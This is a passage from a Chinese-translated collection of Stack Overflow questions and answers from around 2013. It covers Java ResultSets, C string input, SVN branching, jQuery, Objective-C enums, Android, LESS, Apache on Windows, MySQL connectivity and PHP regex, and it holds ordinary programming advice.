您可以在此处阅读文档： [https ://docs.oracle.com/javase/7/docs/api/javax/sql/rowset/CachedRowSet.html](https://docs.oracle.com/javase/7/docs/api/javax/sql/rowset/CachedRowSet.html)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-02-13T12:25:40.307

你正在关闭它`ResultSet`，因此你不能再使用它了。

为了返回表的内容，您必须遍历`ResultSet`并构建每行表示（在 a 中`List`，也许？）。大概每一行代表一些实体，我会为每一行创建一个这样的实体。

```
while (rs.next()) {
   list.add(new Entity(rs));
}
return list; 
```

另一种方法是提供一些回调对象，并且您的`ResultSet`迭代将为每一`ResultSet`行调用该对象。这样你就不需要构建一个代表整个表的对象（如果它很大，这可能是个问题）

```
 while (rs.next()) {
      client.processResultSet(rs);
   } 
```

我不愿意让客户关闭结果集/语句/连接。这些需要仔细管理以避免资源泄漏，并且最好在一个地方处理它（最好靠近打开它们的地方！）。

注意：您可以使用[Apache Commons DbUtils.closeQuietly()](http://commons.apache.org/dbutils/apidocs/org/apache/commons/dbutils/DbUtils.html)简单可靠地关闭连接/语句/结果集元组（正确处理空值和异常）

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2020-02-24T11:27:49.403

假设您有能力将整个结果存储在内存中，您可以简单地返回一些类似表的结构。例如，使用[Tablesaw](https://github.com/jtablesaw/tablesaw)，只需执行

```
Table t = Table.read().db(rows); 
```

有`rows`一个标准`java.sql.ResultSet`。有关详细信息，请参见[此处](https://jtablesaw.github.io/tablesaw/userguide/importing_data.html#importing-from-a-database)。如果您打算进一步对数据进行切片和切块，Tablesaw 将变得特别有用，因为它为您提供了类似于 Pandas 的功能。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2020-02-24T11:33:23.923

返回结果集是不好的做法，其次你已经关闭了它，所以在关闭它之后你就​​不能再使用它了。我建议在 try 块中使用具有多个资源的 Java 7 将帮助您，如上面建议的那样。如果你想要整个表的结果，你应该返回它的输出而不是结果集。

# c - 在多维数组中存储和检索字符串

> ID：14853511
> 
> 赞同：1
> 
> 时间：2013-02-13T12:24:06.857
> 
> 标签：c, arrays, string

我有以下代码将来自用户的字符串输入 N 次存储在多维数组中。然后打印出第二个元素。

```
main()
{

    // Array to store 10 strings, 20 characters long.
    char strStorage[10][20];

    printf("\nEnter how many strings: ");
    scanf( "%d" , &num);
    fflush(stdin);

    for ( count = 0 ; count < num ; count++)
    {
        printf("Enter a string: ");
        gets(strStorage[count]);
        fflush(stdin);
    }

    printf("%s", strStorage[2]); 
```

最后一行打印出垃圾。用户输入在垃圾中不可见，因此我的元素访问错误或我的存储错误。任何人都可以帮助我解决问题吗？

提前致谢...

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T12:31:50.290

`strStorage[2]`是**第三个**字符串，所以如果`num`小于**3**，你不会初始化它，它会包含垃圾。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T13:26:45.113

`scanf("%d", &num);`不确保 num 包含一个值。也许明智的做法是检查 scanf 的返回值以确保它读取 1 值，如下所示：`if (scanf("%d", &num) != 1) { puts("Error reading integer"); }`

当我们讨论这个话题时，我假设 num 和 count 被声明为一个 int，而你已经对我们隐藏了这些声明。啧啧！你需要我们的帮助吗？如果是这样，那么使您的代码可编译！你真的认为 int 适合存储数组的索引吗？它们可能具有负值。我建议改用`size_t`,`%zu`格式说明符告诉 scanf 期望来自标准输入的 size_t 值。

...当 size_t 包含的值大于数组中的元素数时会发生什么？我建议研究可变长度数组。

`fflush(stdin);`是胡说八道，因为 fflush 定义了为输出打开的文件的行为，而 stdin 是一个仅为输入打开的文件。这有点像冲马桶并期望废物从马桶中流出，而不是通过 S 形弯。也许您的意思是丢弃一行的其余部分，因为您从一开始就读取了所需的数据。类似的东西`for (int c = getchar(); c >= 0 && c != '\n'; c = getchar());`可能会起作用。

不要使用`gets`. 改为使用`fgets(strStorage[count], sizeof strStorage[count], stdin);`，以确保不会发生缓冲区溢出。

在那里，我想我几乎涵盖了所有未定义的行为和挑剔的东西。

# svn - SVN 分支模型的任何缺点：分支 -> 下一个分支，放弃主干？

> ID：14853515
> 
> 赞同：3
> 
> 时间：2013-02-13T12:24:17.480
> 
> 标签：svn, branch

我们有一个发布模型，为了简单起见，我们会说是每月 1 个。所以，我们通常去：

```
Jan -> trunk
       trunk -> Feb
       trunk <- Feb
Mar <- trunk 
Mar -> trunk
       etc 
```

我们正在考虑放弃主干，给出一个更像：

```
trunk -> Jan
  Jan -> Feb
  Feb -> Mar
  Mar -> Apr
  etc 
```

我们永远不会合并回主干。虽然工作在二月分支进行，但任何紧急修复都在一月分支进行，并合并到二月的代码库。

这似乎提供了很多好处，包括少得多的合并。任何人都发现了明显的缺陷/缺点，最好是从经验中发现？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-13T12:46:32.363

> 这似乎提供了很多好处

看不到*任何东西*，但可以检测到至少一种头痛

> 包括少得多的合并

错误的。两个工作流程中补丁的前向移植具有**相同数量**的合并

**简历**：

Subversion 中的所有 URL 都具有相同的权限，使用路径 /trunk 作为主线只是惯例，您可以忽略它。但是不要忘记sidebacks - 而不是单一`svn up`到比当前月份更早的版本`svn switch & svn up`（并在切换之前识别此版本的URL - 也将日志添加到列表中）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T13:28:18.493

似乎您的分支太早了，并且正试图放弃那个早期的分支，但没有意识到这一点。

在正常的基于主干的工作流程中，一旦“Jan”发布，您就会分支“Jan”。然后你继续在主干上工作，“Feb”分支作为“Feb”被释放。换句话说：**在主干模型中，您将分支推迟到发布点**。当您发现自己将除功能分支或修补程序之外的任何内容合并回主干时，工作流程就会中断。在发布分支上计划大量工作是错误的。主干和功能分支用于面包和黄油的工作；发布分支用于紧急情况。

您的新模型很好，但您可以通过以下方式保持既定的命名约定：

```
 trunk
 trunk -> Jan   /* Release */
 trunk <- Jan   /* Hotfix */
 trunk -> Feb
 trunk -> Mar
 trunk -> Apr 
```

请注意，这在拓扑上等价于无主干模型：

```
trunk                     Jan
 +----------- Jan          +------------   
 +------- Feb  |       Feb +--------   |
 +--- Mar  |   |       Mar +----   |   |
 |     |   |   |       Apr |   |   |   |
 |     |   |   |           |   |   |   |
trunk Mar Feb Jan         Apr Mar Feb Jan 
```

但是，在无主干模型中，您会不断地重命名主干模型中名为“主干”的垂直路径。由于每个人大部分时间都在使用主干，因此命名会通过很多开关阻碍您，就像 LazyBadger 已经说过的那样。

虽然一个的成本`svn switch`肯定不高，但一个被遗忘的成本`svn switch`却是。在某些时候，有人会在`Mar`假期回来后不小心`Apr`在当前的分支上工作。然后您必须检测该问题 (QA)，将代码合并`Apr`到`Mar`. 当通常的工作完成后`trunk`，问题就不会发生，因为`trunk`对于新工作来说总是一个好点。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-10-17T09:49:35.383

为其他读者回答我自己的问题：方法在几个月和几个版本后运行良好；我们希望所有的好处都实现了，没有出现任何缺点。团队一致认为这是一个更好的模型。

# jquery - Jquery - 滚动到 div

> ID：14853517
> 
> 赞同：0
> 
> 时间：2013-02-13T12:24:22.150
> 
> 标签：jquery, scroll

我不能让我的 Jquery 工作。我输入了一些代码，应该可以很好地向下滚动到页面下方的 div。我在 a 标签和 jquery 周围添加了 HTML。

HTML

```
<div id="facebookbanner">   
    <div id="facebookbannertext">
        <div id="knapper">
            <div class="btn_apps"><a href="#fbeksempler"></a></div>
            <div class="btn_bestil"><a href="#"></a></div>
        </div>
     </div>
     <div id="facebookbannerbillede">   
     </div>
 </div> 
```

jQuery

```
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<script>

$('#fbeksempler a').on('click', function(evt){
    evt.preventDefault();
    var target = $(this).attr('href');
    $('html, body').stop().animate({scrollTop: $(target).offset().top}, 2000);
});

</script> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T13:20:03.970

看来主要问题是您在使用该[`.attr()`](http://api.jquery.com/attr/)方法时将目标变量设置为字符串。然后，您尝试滚动到该目标的顶部，该目标不是表示 DOM 元素的 jQuery 对象。

我假设您打算做的是在页面上的某处找到 ID 等于`href`链接的 jQuery 对象。

```
$('#facebookbanner a').on('click', function (evt) {
    evt.preventDefault();
    var contentId = $(this).attr('href');
    var content = $(document).find(contentId);
    $('html, body').stop().animate({
        scrollTop: $(content).offset().top
    }, 2000);
}); 
```

[jsfiddle](http://jsfiddle.net/nVkUd/1/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T12:27:03.767

尝试将您的功能包装在 DOMReady 事件中：

```
$(function() {
    $('#fbeksempler a').on('click', function(evt){
        evt.preventDefault();
        var target = $(this).attr('href');
        $('html, body').stop().animate({scrollTop: $(target).offset().top}, 2000);
    });
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T15:14:58.783

我认为问题在于协议相对 URL`//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js`在本地测试时不起作用。
也许试着`http://code.jquery.com/jquery-1.9.1.min.js`看看这是否适合你。

# iphone - 检查是否存在目标 c 枚举

> ID：14853518
> 
> 赞同：5
> 
> 时间：2013-02-13T12:24:35.690
> 
> 标签：iphone, ios, objective-c

我为按钮 ID 预定义了枚举：

```
typedef enum
{
    button1ID = 407,
    button2ID = 999,
    button3ID = 408,
    button4ID = 409,
} TOP_MENU_BUTTON_TYPE; 
```

我需要确定我收到的 ID 是否在枚举中被定义。我怎样才能做到这一点？就像是：

```
if(id in TOP_MENU_BUTTON_TYPE) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-18T08:22:39.927

没有**办法动态迭代**枚举。枚举是**静态功能**，它们在运行时不存在。在运行时，它们只是普通的整数（一定大小）和值。

您在赏金中陈述的**这个要求**是不可能的：

> 在您的回答中，不要使用枚举的硬编码值，只使用它的类型。

* * *

其他答案向您展示了几乎所有**静态**方法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-19T15:35:31.630

你可以简单地这样做：

```
int validValue = button1ID | button2ID | button3ID | button4ID;
if (validValue & id)
    // Valid enum value 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-20T07:31:49.643

如果我清楚地理解您的问题，那么这将对您有所帮助..

而不是`enum`单独使用，您应该尝试使用`struct`它，@Richard 的答案将帮助您如何做到这一点。

[在运行时更改枚举值？](https://stackoverflow.com/questions/10305315/change-enum-values-at-runtime)

[https://stackoverflow.com/a/10305425/1083859](https://stackoverflow.com/a/10305425/1083859)

在上面的链接中，他解释了如何使用动态`enum`值，`struct`您也可以`iterate`找出这些值。我想你会有一个想法。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-13T12:30:45.040

An`enum`不是对象，它只是编译器在构建时理解的整数。因此，您需要提供低级代码来进行检查。

如果您没有预先定义枚举的值，它们将从 0 开始并增加 1。这使您可以比较一个值以查看它是否是 <= 您的最后一个元素。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-13T12:50:42.943

试试这个方法：

```
-(BOOL)isDefined:(TOP_MENU_BUTTON_TYPE)type{
    BOOL isDefined;
    switch (type) {
        case button1ID:
        case button2ID:
        case button3ID:
        case button4ID:
            isDefined = TRUE;
            break;
        default:
            isDefined = FALSE;
            break;
    }
    return isDefined;
}

//(...)
    TOP_MENU_BUTTON_TYPE test;
    test = 407;
    NSLog(@"is %d a TOP_MENU_BUTTON_TYPE? result: %d", test, [self isDefined:test]);
    test = 2;
    NSLog(@"is %d a TOP_MENU_BUTTON_TYPE? result: %d", test, [self isDefined:test]); 
```

所以：

```
if ([self isDefined:test]){
    // OK, test is defined in TOP_MENU_BUTTON_TYPE
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-02-13T12:54:44.333

在.h

```
typedef enum
{
    407,
    999,
    408,
    409,
} TOP_MENU_BUTTON_TYPE;

@interface CheckoutController : UIViewController{
TOP_MENU_BUTTON_TYPE type;
} 
```

在.m

```
switch (status) {
        case 407:
            //Your Task
            break;
        case 999:
            //Your Task
            break;
        case 408:
            //Your Task
            break;
        case 409:
            //Your Task
            break;
    } 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-02-17T09:47:05.243

`switch`关于 using或一堆`||`in的答案`if`是正确的，但是……</p>

如果你有**很大的枚举**（有很多值的枚举），你可以让它更简单。Cocoa 也使用了这个技巧。

您的枚举值必须**增加一**。
然后向枚举添加两个附加值：

```
typedef enum {
    buttonIDMin = 407, // Lowest value

    button1ID = 407,
    button2ID = 408, // Incremented by ONE
    button3ID = 409,
    button4ID = 410,

    buttonIDMax = 410, // Highest value

} TOP_MENU_BUTTON_TYPE; 
```

当您进行比较时，您只需要执行以下操作：

```
if (buttonID >= buttonIDMin && buttonID <= buttonIDMax) ... 
```

# asp.net-mvc - .ajax 获取保持数据在控制器中保持为空

> ID：14853519
> 
> 赞同：-1
> 
> 时间：2013-02-13T12:24:37.533
> 
> 标签：asp.net-mvc, jquery

我正在尝试使用以下函数来获取一些数据。

```
function SaveData() {
            var value = $('#tblRadio').find('input[type="radio"]:checked').val();
            $.ajax({
               type: "POST",
            url: '/home/IsEmployeeVoted',
            success: function (result) {
                alert(result); // shows whole dom
                if (parseInt(result) > 0) {
                    $('div.dvVoteWrapper').removeAttr('style');
                    $('div.popupArea').removeAttr('style');
                }
                else {
                    window.location = '/home/EmployeeVote?regoinID='+ value;
                }
            },
            error: function () {
                alert("Sorry, The requested property could not be found.");
            }
        });
        } 
```

控制器功能：

```
public ActionResult EmployeeVote(string regionID)
 {
 } 
```

尽管 value 变量在 javascript 中有一些值，但 regionId 对我来说一直是 null。有任何想法吗 ？？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:26:00.537

改变

```
data: 'regionID=' + value, 
```

到

```
data: {regionID: value}, 
```

您需要将数据作为对象文字传递。另一种选择（我不推荐），更接近您的想法：

```
url: '/home/IsEmployeeVoted?regoinID=' + value, 
```

但是如果你想让它工作，你需要删除`type: 'POST'`（因为 GET 是默认类型）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T12:26:39.057

几个问题：

```
var value = $('#tblRadio').find('input[type="radio"]:checked').val(); 
```

我会确保它`value`不是未定义/空的。

`alert(value)`在ajax调用之前使用。

您还指定`GET`但`POSTING`数据到服务器。

例如，您还可以将 regionId 包装在 javascript 对象中。

```
 $.ajax({
            type: "POST",
            data: { regionID: value },
            url: '/home/IsEmployeeVoted',
            success: function (data) {
                alert(data); // shows whole dom
                if (parseInt(data) > 0) {
                    $('div.dvVoteWrapper').removeAttr('style');
                    $('div.popupArea').removeAttr('style');
                }
                else {
                    window.location = "/home/EmployeeVote";
                }
            },
            error: function () {
                alert("Sorry, The requested property could not be found.");
            }
        }); 
```

# iphone - 使用 UITableView 显示矩阵类型的数据

> ID：14853526
> 
> 赞同：0
> 
> 时间：2013-02-13T12:25:20.687
> 
> 标签：iphone, ios, xcode, uitableview

![enter image description here](../Images/758b706b593c9a45a225e9137733bebf.png)

Here is the screen shot from Cruise Finder app, I want to implement this kind of `UITableView` in which every row scrolls horizontally(synchronous) with table view scrolling vertically. I need to show a calendar for which First row showing Jun 2013 remains at fixed position, and all other data scrolls in free form. Every row has a title, which does not scroll horizontally e.g. 'Oceania'

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T12:36:51.917

日历不应成为您的`UITableView`. 它应该是一个单独的组件。可能是带有背景图像的 UIScrollView。

您必须创建一个自定义 UITableViewCell 来创建它。在您的自定义 UITableViewCell 中，您必须创建以下内容：

1.  部分。
2.  UILabel 不会滚动和显示标题。例如“大洋洲”
3.  然后一个`UIScrollView`里面一个`UITableView`。哪个只会滚动到您的`UILabel`.

检查下图：

![在此处输入图像描述](../Images/b013e3a07bea72aac359c5338116eb9a.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T12:35:17.510

您可以`UIScrollView`在您的`UITableViewCell`

```
[cell addSubview:yourScrollView]; 
```

# c# - 获取outlook中所有房间的列表

> ID：14853531
> 
> 赞同：2
> 
> 时间：2013-02-13T12:25:32.827
> 
> 标签：c#, vba, outlook, exchange-server, mapi

我正在编写一些应用程序，我需要在我的组织内获得所有可用的房间。（我们在 Outlook 中打开“添加房间”对话框时获得的列表相同）我假设当我们通过 Outlook 执行此操作时，他对某些交换服务器工作，问题是有没有办法将 Outlook 用作我之间的“代理”到交换服务器？

我对exchange一无所知，对outlook的互操作有一点了解...

提前感谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T20:51:16.893

我不知道这是否对您有用，但是查看带有[OutlookSpy](http://www.dimastr.com/outspy)的“所有房间”容器，PR_CONTAINER_FLAGS 属性包含一个未记录的位 0x200。我没有看到为任何其他容器设置相同的位。以下内容对您有用吗？

```
PR_CONTAINER_FLAGS = "http://schemas.microsoft.com/mapi/proptag/0x36000003"
set rooms = Nothing
set lists = Application.Session.AddressLists
for each list in lists
  containerFlags = list.PropertyAccessor.GetProperty(PR_CONTAINER_FLAGS)
  if (containerFlags And &H0200) <> 0 Then
    set rooms = list
    Exit For
  End If
next
if (rooms Is Nothing) Then
  MsgBox "Room container not found"
Else
  MsgBox "Room container was found, its name is " & rooms.Name
  for each room in rooms.AddressEntries
     Debug.Print room.Name & " - " & room.Address
   next
End If 
```

# web-services - SugarCRM 调用外部 Web 服务的简单示例

> ID：14853533
> 
> 赞同：0
> 
> 时间：2013-02-13T12:25:35.690
> 
> 标签：web-services, sugarcrm

我一直在尝试找到一些非常非常简单的例子来说明如何实现从 Sugar CRM 调用一些外部 Web 服务，我发现的所有示例都是 Invoking SugarCRM，但没有运气。例如，使用按钮调用某个 Web 服务并在某个字段中仅返回一个值。有人有这样的链接或例子吗？我想学习如何与一些外部 Web 服务集成？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-05-02T20:12:54.727

这个例子对我帮助很大。

[http://amusarra.github.io/Project/SugarCRM/REST/ClientApplication/HTMLSugarCRMRESTApplication.html](http://amusarra.github.io/Project/SugarCRM/REST/ClientApplication/HTMLSugarCRMRESTApplication.html)

[https://gist.github.com/amusarra/10076577](https://gist.github.com/amusarra/10076577)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-19T17:13:17.813

这是一个简单的工具来做到这一点......

[http://developers.sugarcrm.com/wordpress/2012/05/11/new-for-sugar-6-5-sugarhttpclient/](http://developers.sugarcrm.com/wordpress/2012/05/11/new-for-sugar-6-5-sugarhttpclient/)

如果您想要更高级的东西，您也可以利用 Connections API 来提供帮助......

[http://developers.sugarcrm.com/wordpress/2013/02/15/leveraging-the-connectors-api-for-storing-external-service-api-keys/](http://developers.sugarcrm.com/wordpress/2013/02/15/leveraging-the-connectors-api-for-storing-external-service-api-keys/)

# android - Viewpager上的VideoView，切换页面时停止视频

> ID：14853540
> 
> 赞同：8
> 
> 时间：2013-02-13T12:25:57.743
> 
> 标签：android, android-viewpager, android-videoview

我有一个带有不同片段的浏览器，其中一个有一个视频视图。如果我在播放视频时切换页面，那么即使我在不​​同的页面上，它也会继续播放。我尝试像这样为 ViewPager 实现 OnPageChangeListener：

```
viewpager.setOnPageChangeListener(new OnPageChangeListener() {

            @Override
            public void onPageSelected(int position) {

                if(position!=mAdapter.getCount()-1){
                    MultimediaFragment frag = (MultimediaFragment)mAdapter.getItem(position+1);
                    frag.onPageIsChanged();
                }

                if(position != 0){
                    MultimediaFragment frag = (MultimediaFragment)mAdapter.getItem(position-1);
                    frag.onPageIsChanged();
                }

            } 
```

onPageIsChanged() 是我自己的一种方法，它试图告诉我的 videoview 属性停止和隐藏控件：

```
public void onPageIsChanged() {
        if(mVideoView!=null){
            if(mVideoView.isPlaying()){
                mVideoView.stopPlayback();
            }
            mMedia.hide();
        }
    } 
```

问题是 mVideoView 始终为空，即使它在后台播放也是如此。这个视频视图是在片段的 OnCreateView 方法上创建的，但在片段被销毁之前，它不应该保持设置为我的 mVideoView 字段吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-02-13T15:27:52.240

我通过覆盖该方法解决了这个问题：

```
void setUserVisibleHint(boolean isVisibleToUser) 
```

不知道这是否是正确的方法。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2015-02-17T10:54:29.537

您必须在播放视频的片段中覆盖 setUserVisibleHint 方法。

```
 public void setUserVisibleHint(boolean isVisibleToUser) 
   {       
    super.setUserVisibleHint(isVisibleToUser);                         
     if (this.isVisible())
     {               
        if (!isVisibleToUser)   // If we are becoming invisible, then...
        {  
          //pause or stop video
        }

        if (isVisibleToUser) // If we are becoming visible, then...
        {                               
            //play your video               
        }
    } 
  } 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-10-09T19:03:59.330

很可能您的 mAdapter.getItem 每次都在创建一个新片段。这将导致视频视图始终为空。

```
public class MyAdapter extends FragmentStatePagerAdapter {
    SparseArray<Fragment>fragments = new SparseArray<Fragment>();
    public MyAdapter(FragmentManager fm) {
        super(fm);
    }

    @Override
    public int getCount() {
        return contents.size();
    }

    @Override
    public Fragment getItem(int position) {
        Fragment frag = fragments.get(position);
        Bundle args = new Bundle();
        if(frag != null){
            return frag;
        }
        fragments.put(position, frag);
        return frag;
    }
} 
```

# html - LESS CSS 注释在正确的位置

> ID：14853549
> 
> 赞同：4
> 
> 时间：2013-02-13T12:26:22.547
> 
> 标签：html, css, wordpress, comments, less

我正在使用 LESS CSS 进行 WordPress 主题开发。我刚刚注意到，当我将 LESS 文件编译为 CSS 时，放置在 LESS 文件中的所有注释都被添加到 CSS 文件的顶部（而不是在正确的行上）......有什么办法可以避免这种情况吗？我正在使用 Less for mac 作为编译器，也尝试了 simpLess，但出现了同样的问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-07-06T00:19:33.080

虽然不理想，而且肯定违反惯例，但我将我的评论放在样式定义中。

例如：

```
.style {

    /* Comment for .style */
    ...style definition...

    .inner-style {
        /* Comment for .inner-style */
        ...style definition...
    }
} 
```

# php - 我可以强制 Apache 和 PHP 使用小写/大写文件名吗？

> ID：14853550
> 
> 赞同：1
> 
> 时间：2013-02-13T12:26:25.533
> 
> 标签：php, apache, xampp

我正在 Windows 下开发，需要在我的 PHP 项目中使用大写/小写文件名。有没有办法强制 Apache+PHP (XAMPP) 尊重文件名中大小写字符之间的差异？我的生产服务器是 Linux，所以我总是以某些链接不工作而告终。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T12:48:21.157

这不是 Apache 或 PHP 问题。您正在运行 Windows，因此您可能使用 NTFS 作为硬盘驱动器上的文件系统。默认情况下，NTFS 不区分大小写。这意味着您不能同时拥有“myfile.txt”和“mYfIlE.tXt”。

显然，[您可以更改此](https://superuser.com/questions/266110/how-do-you-make-windows-7-fully-case-sensitive-with-respect-to-the-filesystem). 我不会（期望不区分大小写的软件可能会损坏）。

运行带有 Linux 的虚拟机。将其用作您的开发服务器。

# android - Android SQLite DB表创建后不存在

> ID：14853551
> 
> 赞同：1
> 
> 时间：2013-02-13T12:26:29.753
> 
> 标签：android, android-emulator, sqlite

我正在将我的资产文件夹中的数据库文件复制到安装时的数据库文件夹中。我有一个名为 firstRun 的共享首选项，默认值为 true。如果这是真的，那么我复制数据库文件并将 firstRun 值设置为假。在此过程之后，我立即在数据库表中查询一些数据。在较旧的 Android 版本 (2.1) 上，会发生 SQLite 异常（没有这样的表）并且应用程序崩溃，在 Android 4.2.1 上，dbHelper 会记录相同的消息，但会继续运行并从它未能找到的表中返回值。使用较早的 Android 版本，如果我再次启动该应用程序，则会找到数据库表，并且所有操作都会正常进行。应用程序崩溃后，我可以检查复制的数据库以及表和行是否存在。这似乎与其他真正不存在表的问题不同，因为我可以看到它们确实存在。我想知道这是否是某种同步问题，在复制过程之后表不立即存在，但在进程完成后的某个时刻存在。据我所知，这不是异步完成的，所以我不确定为什么。

这是一些显示问题的代码：

```
SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(getBaseContext());
boolean firstRun = prefs.getBoolean(getString(R.string.first_time_run), true);

if (firstRun) {
    SharedPreferences.Editor edit = prefs.edit();
    edit.putBoolean(getString(R.string.first_time_run), Boolean.FALSE);
    edit.commit();

    try {
        dbHelper.createDatabase();
    } catch (IOException ioe) {
        ioe.printStackTrace();
    }
}
// This method will fire an exception the first time the app is run - no such table
Bundle metaData = dbHelper.fetchAppMetaData();
this.appTitle = metaData.getString("app_title");
this.normalId = Integer.parseInt(metaData.getString("normal_id")); 
```

fetchAppMetaData 方法是一个基本的 sqlite.query：

```
Bundle metaData = new Bundle();
Cursor dbCursor = null;
SQLiteDatabase database = getReadableDatabase();
String[] cols = new String[] {"app_title", "normal_id"};
dbCursor = database.query(true, TBL_METADATA, cols, null, null, null, null, null, null);  

if (dbCursor != null) {  
        dbCursor.moveToFirst(); 
```

最终会返回一个包。

数据库创建方法为：

```
//Open the local db as the input stream
InputStream dbFromAssets = myContext.getAssets().open(DB_NAME);

// Path to the just created empty db
String outFileName = DB_PATH + DB_NAME;

// Check that the directory now exists
File f = new File(DB_PATH);

if (!f.exists()) {
    f.mkdir();
}

// Open the empty db as the output stream
OutputStream appDatabase = new FileOutputStream(outFileName);

// Transfer bytes from the inputfile to the outputfile
byte[] buffer = new byte[1024];
int length;
while ((length = dbFromAssets.read(buffer)) > 0){
    appDatabase.write(buffer, 0, length);
}

// Close the streams - don't cross them!
appDatabase.flush();
appDatabase.close();
dbFromAssets.close(); 
```

如有任何想法，将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:36:32.690

下面是工作代码的剪切和粘贴。每次应用程序加载时，我都会在 MainActivity 启动时使用它。测试和使用版本 2.3 - 4.2：

这是我正在使用的检查代码：

```
try 
    {           
        String destPath = "/data/data/" + getPackageName() + "/databases/(...your db...)";

        File f = new File(destPath);  
        File c = new File("/data/data/" + getPackageName() + "/databases/");

        // ---if directory doesn't exist then create it---
        if (!c.exists()) 
        { 
            c.mkdir();
        }

        // ---if db file doesn't exist then create it---
        if (!f.exists()) 
        { 
            CopyDB(getBaseContext().getAssets().open("...name of db from assets foleder..."), new FileOutputStream(destPath));
        }
    } 
    catch (FileNotFoundException e) 
    {           
        e.printStackTrace();
    } 
    catch (IOException e) 
    {
        e.printStackTrace();
    } 
```

这是我正在使用的代码，如果找不到则进行复制：

```
public void CopyDB(InputStream inputStream, OutputStream outputStream) throws IOException 
{
    //---copy 1K bytes at a time---
    byte[] buffer = new byte[1024];
    int length;
    while ((length = inputStream.read(buffer)) > 0) 
    {
        outputStream.write(buffer, 0, length);
    }

    inputStream.close();
    outputStream.close();
} 
```

希望这是有希望的...

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T13:06:34.273

我的解决方案是在创建数据库后关闭 dbHelper，然后再尝试再次使用它。

例如：

```
try {
    dbHelper.createDatabase();
} catch (Exception e) {
}
dbHelper.close();
dbHelper.fetchAppMetaData(); 
```

希望这对其他人有帮助。

# c# - 如何从 C# 连接在 Web 服务器上运行的 MySQL？

> ID：14853553
> 
> 赞同：1
> 
> 时间：2013-02-13T12:26:31.360
> 
> 标签：c#, mysql

我正在开发一个 C# 应用程序，该应用程序将使用位于我的网站中的远程 MySQL 数据库，该数据库托管在支持 PHP 和 MySQL 的 Linux 服务器上。

我尝试直接连接到 MySQL 数据库，但由于主机端的限制而无法连接。

有人可以帮我吗，我可以用这个限制来做吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:28:10.337

你不能。服务器需要允许远程连接，如果这是不可能的，那么你就不走运了。

但是，可能还有另一种方式......如果您可以在可以连接的服务器上创建一个 Web 服务，那么您应该能够从任何地方虚拟地与 mysql 中的数据进行通信。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T12:29:17.290

您需要访问远程计算机上的端口 3306。您可以使用 telnet 或类似方法测试您是否可以访问此端口

```
telnet ip 3306 
```

这些是您拥有的解决方案：

A）**创建本地开发环境**：您没有提供太多信息。如果我的猜测是正确的，您正在本地开发，稍后您计划将您的 c# 应用程序部署到 Web 服务器，该服务器也将包含 mysql db。

*   在本地机器上安装 mysql
*   获取数据库的副本。
*   配置您的 C# 程序以连接到本地 mysql (localhost:3306)
*   当您将代码部署到您的 Web 服务器时，它还将连接到您的“localhost 3306”，这将是安装到 Web 服务器中的 mysql。

B）**使用VPN访问mysql**：如果A不适用，另一种解决方案是在包含mySQL的Web服务器和运行您的应用程序的PC之间安装某种VPN。设置好 VPN 并且您可以访问端口 3306（如前所述通过 telnet），您的应用程序就可以运行了。

C)**打开端口访问 mysql**：最简单的解决方案是要求管理员为您打开端口。99% 的时候答案是否定的，所以我不会走这条路。（也许您的网络提供商中有某种解决方案允许为给定 IP 打开特定端口，但我对此表示怀疑）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T14:20:50.843

您可以尝试创建一种 API 方式，如果您的服务器阻止来自 Web 的传入连接，只需重载您需要与 PHP 一起使用的 MySQL 函数并将“echo”结果作为服务器，使用您的 c# 应用程序将它们解析为客户端，它是组织这样一个系统的唯一方法，或者，您可以允许传入到 MySQL 的连接，然后在[CodeProject](http://www.codeproject.com/Articles/43438/Connect-C-to-MySQL)上观看这篇文章

# php - 正则表达式：将 select 替换为 select count

> ID：14853554
> 
> 赞同：0
> 
> 时间：2013-02-13T12:26:37.273
> 
> 标签：php, regex

我正在尝试定义一个正则表达式以`select count(*)`从任何选择查询中获取一个。这是我的代码：

```
preg_replace("/(select{1}) (.)+ (from{1}) (.)*/im", "'$1 count(*) $3 $4'", "select columna, columnb from table1 join table2 where a=b", -1, $count); 
```

除了返回“from”之后的最后一个字符之外，它并没有那么糟糕，这是：

```
select count(*) from b 
```
